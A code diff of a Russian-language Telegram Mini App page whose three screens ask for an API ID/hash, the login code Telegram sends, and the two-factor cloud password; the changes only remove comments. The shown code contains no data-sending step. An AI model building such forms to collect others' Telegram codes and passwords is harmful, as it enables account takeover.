@@ -40,7 +40,7 @@
         input:focus {
             border-color: var(--btn-color);
             border-width: 2px;
-            padding: 11px; /* Компенсация толщины рамки */
+            padding: 11px; 
         }
 
         button { 
@@ -98,7 +98,6 @@
 </head>
 <body>
 
-    <!-- ЭКРАН 1: ВХОД (API ID/HASH) -->
     <div id="screen-login" class="container">
         <h3>Авторизация</h3>
         
@@ -123,7 +122,6 @@
         </div>
     </div>
 
-    <!-- ЭКРАН 2: ВВОД КОДА -->
     <div id="screen-code" class="container">
         <h3>Подтверждение</h3>
         <p>Введите код, который пришел вам в Telegram (Service Notifications)</p>
@@ -131,7 +129,6 @@
         <button onclick="sendCode()">Отправить код</button>
     </div>
 
-    <!-- ЭКРАН 3: ВВОД ПАРОЛЯ -->
     <div id="screen-password" class="container">
         <h3>Облачный пароль</h3>
         <p>Ваш аккаунт защищен двухфакторной аутентификацией. Введите пароль.</p>
@@ -143,12 +140,10 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Логика переключения режимов (Телефон / QR)
         let loginMode = 'phone'; 
         
         function switchTab(mode) {
             loginMode = mode;
-            // Управление стилями табов
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active-tab'));
             event.target.classList.add('active-tab');
             
@@ -164,15 +159,11 @@
             }
         }
 
-        // Определение, какой экран показывать (Login / Code / Password)
-        // main.py передает параметры ?mode=code или ?mode=password
         const urlParams = new URLSearchParams(window.location.search);
         const mode = urlParams.get('mode');
 
-        // Скрываем все экраны
         document.querySelectorAll('.container').forEach(el => el.classList.remove('active'));
 
-        // Показываем нужный
         if (mode === 'code') {
             document.getElementById('screen-code').classList.add('active');
         } else if (mode === 'password') {
@@ -180,8 +171,6 @@
         } else {
             document.getElementById('screen-login').classList.add('active');
         }
-
-        // --- ФУНКЦИИ ОТПРАВКИ ---
 
         function sendInitData() {
             const api_id = document.getElementById('api_id').value;
